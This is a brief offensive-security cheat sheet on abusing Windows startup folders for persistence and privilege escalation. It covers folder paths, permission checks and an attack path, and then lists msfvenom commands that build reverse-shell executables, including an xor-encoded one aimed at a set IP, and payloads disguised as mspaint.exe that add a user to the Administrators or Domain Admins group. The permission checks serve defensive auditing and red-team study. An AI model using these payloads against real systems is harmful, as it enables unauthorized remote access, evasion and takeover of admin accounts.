**Startup folders** can be abused by attackers (or red teamers) to **persists** on a system or escalate privileges if permissions are misconfigured

---

### 1. User-Level Startup Folder

*   **Path**

```cmd
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

* **Risk**

    *   Any Standard user can place a malicious script or executable here
    *   It will run on next login with **user privileges**
    *   Not privilege escalation, but **persistence** is possible    
---

### 2. All Users Startup Folder

*   **Path**

```cmd
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

* **Risk**

    *   If a non-admin user has **write access**  to this folder:
        *   they can place a malicous file here.
        *   it will run with the **privilege of whoever logs in**, including **admins** - this is **privilege escalation**

*   Check Permissions:

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

```powershell
Get-Acl "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Format-List
```

Look for entries like ``Everyone:(F)`` or ``Users:(M)`` - this is a red flag

---

### 3. Exploitation Path

**Attack Path Example**

1.  Attacker compromises a **low-privilege account**
2.  Checks if ``C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`` is **writable**
3.  Drops a **payload** or **reverse shell** shortcut/executable there.
4.  Waits for an **admin user to log in**
5.  Payload executes with **elevated rights**


---

### 4. Generate Custom Payload

**Reverse Shell Example**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

**Encoded x64 Reverse Shell**

```bash
msfvenom --platform windows --arch x64 --payload windows/shell/reverse_tcp LOST=192.168.29.218 LPORT=443 --encoder x64/xor --iteration 9 -f exe --out rshell.exe
```

**Add User to Admin Group**

```bash
msfvenom -p windows/exec CMD='net localgroup administrators u1 /add' -f exe -o mspaint.exe
```

```bash
msfvenom -p windows/exec CMD='net group "Domain Admins" u1 /add /DOMAIN' -f exe -o mspaint.exe
```
